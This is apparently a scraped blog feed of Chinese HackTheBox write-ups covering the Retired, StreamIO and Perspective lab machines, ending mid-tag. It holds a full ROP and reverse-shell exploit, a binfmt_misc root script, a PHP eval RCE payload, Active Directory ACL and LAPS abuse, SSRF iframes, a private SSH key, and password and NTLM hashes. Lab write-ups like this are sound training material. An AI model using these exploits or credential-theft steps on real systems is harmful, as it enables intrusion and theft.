print(\"\\n[\\033[1;31m-\\033[1;37m] Saliendo\\n\") sys.exit(1)signal.signal(signal.SIGINT, kill)inip = input(\"\\n[\\033[1;34m*\\033[1;37m] Introduce tu ip (tun0): \")inport = (\"443\")def file(path): request = requests.get(f\"http://10.10.11.154/index.php?page=&#123;path&#125;\", allow_redirects=False) rpath = f\"/tmp/&#123;path.split('/')[-1]&#125;\" with open(rpath,\"wb\") as f: f.write(request.content) return rpathdef rpid(): request = requests.get(f\"http://10.10.11.154/index.php?page=/proc/sched_debug\", allow_redirects=False) pid = re.search(\"activate_licens\\s+([0-9]+)\",request.text).group(1) return piddef adrs(pid): r = requests.get(f\"http://10.10.11.154/index.php?page=/proc/&#123;pid&#125;/maps\", allow_redirects=False) libcb = int(re.search(\"^.*libc.*$\", r.text, re.M).group(0).split(\"-\")[0], 16) libcp = re.search(\"^.*libc.*$\", r.text, re.M).group(0).split(\" \")[-1] libsb = int(re.search(\"^.*libsqlite.*$\", r.text, re.M).group(0).split(\"-\")[0], 16) libsp = re.search(\"^.*libsqlite.*$\", r.text, re.M).group(0).split(\" \")[-1] sbase = int(re.search(\"^.*\\[stack\\].*$\", r.text, re.M).group(0).split(\"-\")[0], 16) ssend = int(re.search(\"^.*\\[stack\\].*$\", r.text, re.M).group(0).split(\"-\")[1].split()[0], 16) return libcb, libcp,libsb, libsp, sbase, ssenddef bof(): ip = socket.inet_aton(inip) port = port=struct.pack(\"&gt;H\",int(inport)) payload = b\"\" payload += b\"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\" payload += b\"\\x97\\x48\\xb9\\x02\\x00\" + port + ip + b\"\\x51\\x48\" payload += b\"\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\" payload += b\"\\x48\\xff\\xce\\x6a\\x21\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\" payload += b\"\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\" payload += b\"\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\" pid = rpid() libcb, libcp, libsb, libsp, sbase, ssend = adrs(pid) ssize = ssend - sbase context.clear(arch='amd64') libc = ELF(file(libcp),checksec=False) libc.address = libcb libsql = ELF(file(libsp),checksec=False) libsql.address = libsb rop = ROP([libc, libsql]) offset = 520 prt = libc.symbols['mprotect'] rdi = rop.rdi[0] rsi = rop.rsi[0] rdx = rop.rdx[0] rsp = rop.jmp_rsp[0] exploit = b'A' * offset exploit += p64(rdi) + p64(sbase) exploit += p64(rsi) + p64(ssize) exploit += p64(rdx) + p64(7) exploit += p64(prt) exploit += p64(rsp) exploit += payload requests.post(f\"http://10.10.11.154/activate_license.php\", files = &#123; \"licensefile\": exploit &#125; )threading.Thread(target=bof, args=()).start()shell = listen(443, timeout=60).wait_for_connection()shell.sendline(b\"export TERM=xterm HOME=/var/www\")shell.interactive() website_backup枚举可以发现一个website_backup定时运行,其中调用的是/usr/bin/webbackup： 123456789101112131415161718systemctl list-timersThu 2022-06-23 05:24:00 UTC 31s left Thu 2022-06-23 05:23:09 UTC 19s ago website_backup.timer website_backup.service$ find / -name website_backup.service 2&gt;/dev/null/etc/systemd/system/website_backup.service$ cat /etc/systemd/system/website_backup.service[Unit]Description=Backup and rotate website[Service]User=devGroup=www-dataExecStart=/usr/bin/webbackup[Install]WantedBy=multi-user.target /usr/bin/webbackup继续检查这个，发现其中调用zip，我们可以考虑使用软链接让它压缩我们想要获取的文件： 123456789101112131415161718192021$ cat /usr/bin/webbackup#!/bin/bashset -euf -o pipefailcd /var/www/SRC=/var/www/htmlDST=\"/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip\"/usr/bin/rm --force -- \"$DST\"/usr/bin/zip --recurse-paths \"$DST\" \"$SRC\"KEEP=10/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \\ | sort --zero-terminated --numeric-sort --reverse \\ | while IFS= read -r -d '' backup; do if [ \"$KEEP\" -le 0 ]; then /usr/bin/rm --force -- \"$backup\" fi KEEP=\"$((KEEP-1))\" done 软链接所以就是创建一个软链接，等待执行后去解压生成的zip文件，获取对应文件 12345678$ cd /var/www/html$ ln -s /home/dev/.ssh/id_rsa id_rsa$ cp /var/www/2022-06-23_05-50-09-html.zip /tmp$ cd /tmp$ unzip 2022-06-23_05-50-09-html.zip$ cat var/www/html/id_rsa dev_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEA58qqrW05&#x2F;urHKCqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN&#x2F;yfdb6Nzw5wfLeLD4uDt8k9M7RPgkdnIRwdNFxleNHuHWmK0j7OOQ0rUsrs8LudOdkHGu0qQrAnCIpK3Gb74zh6pe03zHVcZyLR2tXWmoXqRF8gE2hsry&#x2F;AECZRSfaYRhac6lASRZD74bQbxOeSuNyMfCsbJ&#x2F;xKvlupiMKcbD+7RHysCSM6xkgBoJ+rraSpYTiXs&#x2F;vihkp6pN2jMRa&#x2F;eeADRNWoyqU7LVsKwhZ&#x2F;&#x2F;AxKjJSvDSnaUeIDaKZ6e4XYsOKTXX3Trh7u9Bjv2YFD8DRDEmDI5d+t6Imws8370a&#x2F;5Z2z7C7jfCpzDATek0NIqLi3jEmI&#x2F;8vLO9xIckjaNVoqw&#x2F;BVKNqjd03KKK2Y0c5DRArFmwkJdmbGxwzyTV8oQZdjw0mVBFjbdQ0iiQBEFGNP9&#x2F;zpT&#x2F;&#x2F;ewaosZYROE4FHXNEIq23Z3SxUNyUeLqkI8Mlf0McBmvc&#x2F;ozGR5AAAFgKXd9Tyl3fU8AAAAB3NzaC1yc2EAAAGBAOfKqq1tOf7qxygqgoHCD4RpGutGPp0HJ4B0uiLxuOIHG98NBzf8n3W+jc8OcHy3iw+Lg7fJPTO0T4JHZyEcHTRcZXjR7h1pitI+zjkNK1LK7PC7nTnZBxrtKkKwJwiKStxm++M4eqXtN8x1XGci0drV1pqF6kRfIBNobK8vwBAmUUn2mEYWnOpQEkWQ++G0G8TnkrjcjHwrGyf8Sr5bqYjCnGw&#x2F;u0R8rAkjOsZIAaCfq62kqWE4l7P74oZKeqTdozEWv3ngA0TVqMqlOy1bCsIWf&#x2F;wMSoyUrw0p2lHiA2imenuF2LDik119064e7vQY79mBQ&#x2F;A0QxJgyOXfreiJsLPN+9Gv+Wds+wu43wqcwwE3pNDSKi4t4xJiP&#x2F;LyzvcSHJI2jVaKsPwVSjao3dNyiitmNHOQ0QKxZsJCXZmxscM8k1fKEGXY8NJlQRY23UNIokARBRjT&#x2F;f86U&#x2F;&#x2F;3sGqLGWEThOBR1zRCKtt2d0sVDclHi6pCPDJX9DHAZr3P6MxkeQAAAAMBAAEAAAGAEOqioDubgvZBiLXphmzSUxiUpV0gDrfJ8z8RoqE&#x2F;nAdmylWaFET0olRA5z6niQKgPIczGsOuGsrrDpgFd84kd4DSywmPNkhQoF2DEXjbk5RJzJv0spcbRKTQc8OFZcMqCYHemkux79ArRVm&#x2F;X6uT40O+ANMLMOg8YA47+GEkxEj3n81Geb8GvrcPTlJxf5x0dl9sPt+hxSIkPjvUfKYV7mw9nEzebvYmXBhdHsF8lOtyTR76WaUWtUUJ2EExSD0Am3DQMq4sgLT9tb+rlU7DoHtoSPX6CfdInH9ciRnLG1kVbDaEaaNT2anONVOswKJWVYgUN83cCCPyRzQJLPC6u7uSdhXU9sGuN34m5wQYp3wFiRnIdKgTcnI8IoVRX0rnTtBUWeiduhdi2XbYh5OFFjh77tWCi9eTR7wopwUGR0u5sbDZYGPlOWNk22+NcwqQMIq0f4TBegkOUNV85gyEkIwifjgvfdw5FJ4zhoVbbevgo7IVz3gIYfDjktTF+n9dAAAAwDyIzLbm4JWNgNhrc7Ey8wnDEUAQFrtdWMS&#x2F;UyZY8lpwj0uVw8wdXiV8rFFPZezpyio9nrxybImQU+QgCBdqQSavk4OJetk29fk7X7TWmKw5dwLuEDbJZo8X&#x2F;MozmhgOR9nhMrBXR2g&#x2F;yJuCfKA0rcKby+3TSbl&#x2F;uCk8hIPUDT+BNYyR5yBggI7+DKQBvHa8eTdvqGRnJ9jUnP6tfBKCKW97HIfCpt5tzoKiJ7&#x2F;eAuGEjjHN28GP1u4iVoD0udnUHQAAAMEA+RceJG5scCzciPd97zsHHTpQNhKQs13qfgQ9UGbyCit+eWzc&#x2F;bplfm5ljfw+cFntZULdkhiFCIosHPLxmYe8r0FZUzTqOeDCVK9AZjn8uy8VaFCWb4jvB+oZ3d+pjFKXIVWpl0ulnpOOoHHIoM7ghudXb0vFL8+QpuPCuHrb2N9JVLxHrTyZh3+v9Pg&#x2F;R6Za5RCCT36R+W6es8Exoc9itANuoLudiUtZif84JIKNaGGi6HGdAqHaxBmEn7N&#x2F;XDu7AAAAwQDuOLR38jHklS+pmYsXyLjOSPUlZI7EAGlCxW5PH&#x2F;X1MNBfBDyB+7qjFFx0tTsfVRboJvhiYtRbg&#x2F;NgfBpnNH8LpswL0agdZyGw3Np4w8aQSXt9vNnIW2hDwX9fIFGKaz58FYweCXzLwgRVGBfnpq2QSXB0iXtLCNkWbAS9DM3esjsA1JCCYKFMrvXeeshyxnKmXix+3qeoh8TTQvr7ZathE5BQrYXvfRwZJQcgh8yv71pNT3Gpia7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ&#x3D;-----END OPENSSH PRIVATE KEY----- user flag使用得到的私钥登录dev用户： emuemuemuemu目录里两个二进制文件，提供有源码： reg_helper发现binfmt_misc相关： 搜索可以发现实际使用的lib目录下的reg_helper,和当前目录的一致： 也可以发现binfmt_misc相关利用： toffan/binfmt_misc: Kernel Support for miscellaneous (your favourite) exploitshttps://github.com/toffan/binfmt_misc 提权 &amp; root flag上面的脚本修改一些代码为当前环境信息，运行，root 删除not_writeable因为我们没有对应的写权限 最终的echo那里使用对应文件 12echo \"$binfmt_line\" &gt; \"$mountpoint\"/registerecho \"$binfmt_line\" | /usr/lib/emuemu/reg_helper exp.sh123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#!/bin/bashreadonly searchsuid=\"/bin/\"readonly mountpoint=\"/proc/sys/fs/binfmt_misc\"readonly exe=\"$0\"warn()&#123; 1&gt;&amp;2 echo $@&#125;die()&#123; warn $@ exit -1&#125;usage()&#123; cat 1&gt;&amp;2 &lt;&lt;EOFUsage: $exe Gives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable, note that it must be enforced by any other mean before your try this, for example by typing something like \"sudo chmod +6 /*/*/f*/*/*r\" while Dave is thinking that you are fixing his problem.EOF exit 1&#125;function pick_suid()&#123; find \"$1\" -perm -4000 -executable \\ | tail -n 1&#125;function read_magic()&#123; [[ -e \"$1\" ]] &amp;&amp; \\ [[ \"$2\" =~ [[:digit:]]+ ]] &amp;&amp; \\ dd if=\"$1\" bs=1 count=\"$2\" status=none \\ | sed -e 's-\\x00-\\\\x00-g'&#125;[[ -n \"$1\" ]] &amp;&amp; usagetarget=\"$(pick_suid \"$searchsuid\")\"test -e \"$target\" || die \"Error: Unable to find a suid binary in $searchsuid\"binfmt_magic=\"$(read_magic \"$target\" \"126\")\"test -z \"$binfmt_magic\" &amp;&amp; die \"Error: Unable to retrieve a magic for $target\"fmtname=\"$(mktemp -u XXXX)\"fmtinterpr=\"$(mktemp)\"gcc -o \"$fmtinterpr\" -xc - &lt;&lt;- __EOF__ #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;stdio.h&gt; #include &lt;pwd.h&gt; int main(int argc, char *argv[]) &#123; // remove our temporary file unlink(\"$fmtinterpr\"); // remove the unused binary format FILE* fmt = fopen(\"$mountpoint/$fmtname\", \"w\"); fprintf(fmt, \"-1\\\\n\"); fclose(fmt); // MOTD setuid(0); uid_t uid = getuid(); uid_t euid = geteuid(); struct passwd *pw = getpwuid(uid); struct passwd *epw = getpwuid(euid); fprintf(stderr, \"uid=%u(%s) euid=%u(%s)\\\\n\", uid, pw-&gt;pw_name, euid, epw-&gt;pw_name); // welcome home char* sh[] = &#123;\"/bin/sh\", (char*) 0&#125;; execvp(sh[0], sh); return 1; &#125;__EOF__chmod a+x \"$fmtinterpr\"binfmt_line=\"_$&#123;fmtname&#125;_M__$&#123;binfmt_magic&#125;__$&#123;fmtinterpr&#125;_OC\"echo \"$binfmt_line\" | /usr/lib/emuemu/reg_helperexec \"$target\" shadow12root:$y$j9T$WTPWClbhbDs7l.UxQ36u80$ARJoOe6zhfOEca5WFBXjo4fGaxCg1Iof6qTbrfn1CzA:19062:0:99999:7:::dev:$6$kxjJ4ZicR62IY8ot$YKNoHWo9jQdRnNQ2f9dKX4IUI70ocRkClcIjUfoI&#x2F;RF0.q6UeWLf2Jb8AfNyBHjJPxS0o5a7MhBR9g.eNfu8&#x2F;.:18913:0:99999:7::: 参考资料 toffan/binfmt_misc: Kernel Support for miscellaneous (your favourite) exploitshttps://github.com/toffan/binfmt_misc HTB - Retired (Box) | BreachForumshttps://breached.to/Thread-HTB-Retired-Box?highlight=Retired Writeup Retired HackTheBoxhttps://gatogamer1155.github.io/hackthebox/retired/ Autopwns/Retired at main · GatoGamer1155/Autopwnshttps://github.com/GatoGamer1155/Autopwns/tree/main/Retired","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"StreamIO - HackTheBox","slug":"StreamIO-HackTheBox","date":"2022-06-14T06:22:41.000Z","updated":"2022-09-19T00:53:20.966Z","comments":true,"path":"2022/06/14/StreamIO-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/06/14/StreamIO-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/474 10.10.11.158 端口扫描windows 域机器： 123456789101112131415161718192021222324252627282930313233343536373839404142434445$ nmap -sC -sV 10.10.11.158Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-13 15:35 CSTNmap scan report for 10.10.11.158Host is up (0.19s latency).Not shown: 987 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus80/tcp open http Microsoft IIS httpd 10.0|_http-title: IIS Windows Server|_http-server-header: Microsoft-IIS/10.0| http-methods:|_ Potentially risky methods: TRACE88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-06-13 14:37:27Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found| ssl-cert: Subject: commonName=streamIO/countryName=EU| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb| Not valid before: 2022-02-22T07:03:28|_Not valid after: 2022-03-24T07:03:28| tls-alpn:|_ http/1.1|_http-server-header: Microsoft-HTTPAPI/2.0|_ssl-date: 2022-06-13T14:38:21+00:00; +7h00m01s from scanner time.445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)3269/tcp open tcpwrappedService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-time:| date: 2022-06-13T14:37:43|_ start_date: N/A| smb2-security-mode:| 3.1.1:|_ Message signing enabled and required|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 160.82 seconds 80直接访问是IIS默认页面： 443 watch.streamIO.htb证书里可以得到域名，加hosts后访问： 110.10.11.158 watch.streamIO.htb 443 streamIO.htb streamIO.htbsql注入 login存在注入,很费时间，最终得到hash，破解出来密码： 1234sqlmap -r login.txt --force-ssl# 密码包括最后那两个点yoshihide : 66boysandgirls.. adminadmin中本身有几个功能,fuzz参数可以发现debug： 123456https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?user&#x3D;https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?staff&#x3D;https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?movie&#x3D;https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?message&#x3D;SecLists&#x2F;Fuzzing&#x2F;fuzz-Bo0oM.txt debugdebug那里可以使用php伪协议： 123https:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?debug&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php$connection &#x3D; array(&quot;Database&quot;&#x3D;&gt;&quot;STREAMIO&quot;, &quot;UID&quot; &#x3D;&gt; &quot;db_admin&quot;, &quot;PWD&quot; &#x3D;&gt; &#39;B1@hx31234567890&#39;); master继续进行fuzz可以发现master.php,发现其中调用eval,根据代码分析构造请求，RCE: 12345data:&#x2F;&#x2F;text&#x2F;plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7system($_GET[&#39;cmd&#39;]);POSThttps:&#x2F;&#x2F;streamio.htb&#x2F;admin&#x2F;?debug&#x3D;master.php&amp;cmd&#x3D;whoami master.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;h1&gt;Movie managment&lt;/h1&gt;&lt;?phpif(!defined('included')) die(\"Only accessable through includes\");if(isset($_POST['movie_id']))&#123;$query = \"delete from movies where id = \".$_POST['movie_id'];$res = sqlsrv_query($handle, $query, array(), array(\"Scrollable\"=&gt;\"buffered\"));&#125;$query = \"select * from movies order by movie\";$res = sqlsrv_query($handle, $query, array(), array(\"Scrollable\"=&gt;\"buffered\"));while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))&#123;?&gt;&lt;div&gt; &lt;div class=\"form-control\" style=\"height: 3rem;\"&gt; &lt;h4 style=\"float:left;\"&gt;&lt;?php echo $row['movie']; ?&gt;&lt;/h4&gt; &lt;div style=\"float:right;padding-right: 25px;\"&gt; &lt;form method=\"POST\" action=\"?movie=\"&gt; &lt;input type=\"hidden\" name=\"movie_id\" value=\"&lt;?php echo $row['id']; ?&gt;\"&gt; &lt;input type=\"submit\" class=\"btn btn-sm btn-primary\" value=\"Delete\"&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;?php&#125; # while end?&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&lt;h1&gt;Staff managment&lt;/h1&gt;&lt;?phpif(!defined('included')) die(\"Only accessable through includes\");$query = \"select * from users where is_staff = 1 \";$res = sqlsrv_query($handle, $query, array(), array(\"Scrollable\"=&gt;\"buffered\"));if(isset($_POST['staff_id']))&#123;?&gt;&lt;div class=\"alert alert-success\"&gt; Message sent to administrator&lt;/div&gt;&lt;?php&#125;$query = \"select * from users where is_staff = 1\";$res = sqlsrv_query($handle, $query, array(), array(\"Scrollable\"=&gt;\"buffered\"));while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))&#123;?&gt;&lt;div&gt; &lt;div class=\"form-control\" style=\"height: 3rem;\"&gt; &lt;h4 style=\"float:left;\"&gt;&lt;?php echo $row['username']; ?&gt;&lt;/h4&gt; &lt;div style=\"float:right;padding-right: 25px;\"&gt; &lt;form method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"staff_id\" value=\"&lt;?php echo $row['id']; ?&gt;\"&gt; &lt;input type=\"submit\" class=\"btn btn-sm btn-primary\" value=\"Delete\"&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;?php&#125; # while end?&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&lt;h1&gt;User managment&lt;/h1&gt;&lt;?phpif(!defined('included')) die(\"Only accessable through includes\");if(isset($_POST['user_id']))&#123;$query = \"delete from users where is_staff = 0 and id = \".$_POST['user_id'];$res = sqlsrv_query($handle, $query, array(), array(\"Scrollable\"=&gt;\"buffered\"));&#125;$query = \"select * from users where is_staff = 0\";$res = sqlsrv_query($handle, $query, array(), array(\"Scrollable\"=&gt;\"buffered\"));while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))&#123;?&gt;&lt;div&gt; &lt;div class=\"form-control\" style=\"height: 3rem;\"&gt; &lt;h4 style=\"float:left;\"&gt;&lt;?php echo $row['username']; ?&gt;&lt;/h4&gt; &lt;div style=\"float:right;padding-right: 25px;\"&gt; &lt;form method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"user_id\" value=\"&lt;?php echo $row['id']; ?&gt;\"&gt; &lt;input type=\"submit\" class=\"btn btn-sm btn-primary\" value=\"Delete\"&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;?php&#125; # while end?&gt;&lt;br&gt;&lt;hr&gt;&lt;br&gt;&lt;form method=\"POST\"&gt;&lt;input name=\"include\" hidden&gt;&lt;/form&gt;&lt;?phpif(isset($_POST['include']))&#123;if($_POST['include'] !== \"index.php\" ) eval(file_get_contents($_POST['include']));elseecho(\" ---- ERROR ---- \");&#125;?&gt; reverse shell可以直接msf生成上线命令，方便后续操作： portfwd 1433前面已经得到数据库账号密码，转发端口： 123portfwd add -l 1433 -p 1433 -r 127.0.0.1$connection &#x3D; array(&quot;Database&quot;&#x3D;&gt;&quot;STREAMIO&quot;, &quot;UID&quot; &#x3D;&gt; &quot;db_admin&quot;, &quot;PWD&quot; &#x3D;&gt; &#39;B1@hx31234567890&#39;); backup数据库可以发现streamio_backup,users表中可以获得nikk37用户密码，这是机器上有的账户： 1231,nikk37 ,389d14cb8e4e9b94b137deb1caf0612a get_dem_girls2@yahoo.com 得到的hash直接在线解密，得到明文密码： user flag得到的账号密码登录，user flag 需要把stream.htb也加到hosts 12310.10.11.158 watch.streamIO.htb streamIO.htb stream.htbevil-winrm -i stream.htb -u nikk37 -p &quot;get_dem_girls2@yahoo.com&quot; 提权信息firefox机器上装有firefox，提取登录信息进行解密 lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwordshttps://github.com/lclevy/firepwd 12345678910111213C:\\Users\\nikk37\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\br53rxeg.default-release\\key4.dblogins.jsonpython3 firepwd&#x2F;firepwd.pydecrypting login&#x2F;password pairshttps:&#x2F;&#x2F;slack.streamio.htb:b&#39;admin&#39;,b&#39;JDg0dd1s@d0p3cr3@t0r&#39;https:&#x2F;&#x2F;slack.streamio.htb:b&#39;nikk37&#39;,b&#39;n1kk1sd0p3t00:)&#39;https:&#x2F;&#x2F;slack.streamio.htb:b&#39;yoshihide&#39;,b&#39;paddpadd@12&#39;https:&#x2F;&#x2F;slack.streamio.htb:b&#39;JDgodd&#39;,b&#39;password@12&#39; bloodhoundbloodhound收集信息，发现可以从JDgodd打到Administrator 1bloodhound-python -u nikk37 -ns 10.10.11.158 -d streamio.htb -c All 提权core staff根据bloodhound的信息，JDgodd对core staff有WriteOwner权限，core staff有权限去获取laps密码，所以首先把JDgodd加到core staff组中： 1234567upload PowerView.ps1Import-Module .\\PowerView.ps1$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force$Cred = New-Object System.Management.Automation.PSCredential('streamio\\JDgodd', $SecPassword)Add-DomainObjectAcl -Credential $Cred -TargetIdentity \"Core Staff\" -principalidentity \"streamio\\JDgodd\"Add-DomainGroupMember -identity \"Core Staff\" -members \"streamio\\JDgodd\" -credential $Cred laps password 现在可以使用JDgodd去获取laps密码： 123456789101112sudo apt install lapsdumperlapsdumper -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htbDC$:j50th8dNh2($Ae# 也可以继续使用powershell$Computers = Get-ADComputer -Credential $Cred -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime$Computers | Sort-Object ms-Mcs-AdmPwdExpirationTime | Format-Table -AutoSize Name, DnsHostName, ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTimeName DnsHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime---- ----------- ------------- ---------------------------DC DC.streamIO.htb j50th8dNh2($Ae 132997693606874315 root flag得到的laps密码就是Administrator密码,flag在Martin桌面： 1evil-winrm -i streamio.htb -u Administrator -p 'j50th8dNh2($Ae' hash12345678910impacket-secretsdump -just-dc-ntlm Administrator@10.10.11.158Administrator:500:aad3b435b51404eeaad3b435b51404ee:45be1d36942e3eb589e8b0d372198f3d:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f5142aae3cce656285ce4504605dec1:::JDgodd:1104:aad3b435b51404eeaad3b435b51404ee:8846130392c4169cb552fe5b73b046af:::Martin:1105:aad3b435b51404eeaad3b435b51404ee:a9347432fb0034dd1814ca794793d377:::nikk37:1106:aad3b435b51404eeaad3b435b51404ee:17a54d09dd09920420a6cb9b78534764:::yoshihide:1107:aad3b435b51404eeaad3b435b51404ee:6d21f46be3697ba16b6edef7b3399bf4:::DC$:1000:aad3b435b51404eeaad3b435b51404ee:fac45a493cb064a17fabefae8d723613::: 参考资料 lclevy/firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwordshttps://github.com/lclevy/firepwd StreamIO - HTB [Discussion] | BreachForumshttps://breached.co/Thread-StreamIO-HTB-Discussion HTB: StreamIO – Syn’s writeupshttps://synisl33t.com/2022/06/06/htb-streamio/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Perspective - HackTheBox","slug":"Perspective-HackTheBox","date":"2022-06-02T06:08:05.000Z","updated":"2022-10-17T01:42:46.098Z","comments":true,"path":"2022/06/02/Perspective-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/06/02/Perspective-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/451 10.10.11.151 端口扫描22和80: 1234567891011121314151617181920$ nmap -sC -sV 10.10.11.151Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 13:31 CSTNmap scan report for 10.10.11.151Host is up (0.20s latency).Not shown: 998 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0)| ssh-hostkey:| 2048 d6:7f:3f:d4:22:15:ce:64:f3:c8:00:79:bf:f6:f8:f8 (RSA)| 256 08:c6:d4:f3:98:84:0f:fd:4b:ed:e3:a6:25:bd:e7:70 (ECDSA)|_ 256 32:81:6a:8b:4d:f9:61:09:ff:d3:99:6c:e7:3f:a3:ac (ED25519)80/tcp open http Microsoft IIS httpd 10.0|_http-title: Site doesn't have a title (text/html).| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 133.66 seconds 80添加hosts后访问，一个NPRS： 110.10.11.151 perspective.htb NPRS注册登录,support那里可以得到管理员邮箱： 1admin@perspective.htb reset password登录时选择忘记密码，第一步输入自己的注册邮箱，第二步密保问题留空，拦截修改为admin邮箱，成功重置admin密码 Admin Panel管理员功能是加载用户信息生成pdf： include file回到普通用户界面，创建新商品，上传图片功能，结合web应用，进行文件读取： ASP Including Fileshttps://www.w3schools.com/asp/asp_incfiles.asp 根据web.config内容，下一步是localhost的8080 123456&lt;appSettings&gt; &lt;add key=\"environment\" value=\"Production\" /&gt; &lt;add key=\"Domain\" value=\"perspective.htb\" /&gt; &lt;add key=\"ViewStateUserKey\" value=\"ENC1:3UVxtz9jwPJWRvjdl1PfqXZTgg==\" /&gt; &lt;add key=\"SecurePasswordServiceUrl\" value=\"http://localhost:8000\" /&gt; &lt;/appSettings&gt; local 8080这里结合admin的pdf功能，Description那里加载我们控制的html，其中是iframe加载local 8080: 渲染过程中会执行iframe加载local 8080，是一个swagger： Description1&lt;META HTTP-EQUIV&#x3D;&quot;refresh&quot; CONTENT&#x3D;&quot;0;url&#x3D;http:&#x2F;&#x2F;10.10.14.8&#x2F;test.html&quot;&gt; test.html12&lt;iframe src&#x3D;&quot;http:&#x2F;&#x2F;localhost:8000&#x2F;&quot; height&#x3D;&quot;2000px&quot; width&#x3D;&quot;2000px&quot; &gt;&lt;&#x2F;iframe&gt; Decrypt后面就是一步步获取信息,调用接口解密ViewStateUserKey： 1SAltysAltYV1ewSTaT3 swagger.html1&lt;iframe src= \"http://localhost:8000/swagger/v1/swagger.json\" height= \"2000px\" width= \"2000px\" &gt;&lt;/iframe&gt; decrypt.html1234567891011&lt;html&gt;&lt;body&gt;&lt;h1&gt;Pwned&lt;/h1&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;form id=\"Pwnform\" target=\"iframe\" method=\"post\" action=\"http://localhost:8000/decrypt?cipherTextRaw=ENC1%3a3UVxtz9jwPJWRvjdl1PfqXZTgg%3d%3d\"&gt;&lt;input type=\"text\"&gt;&lt;/form&gt;&lt;iframe name=\"iframe\"&gt;&lt;/iframe&gt;&lt;script 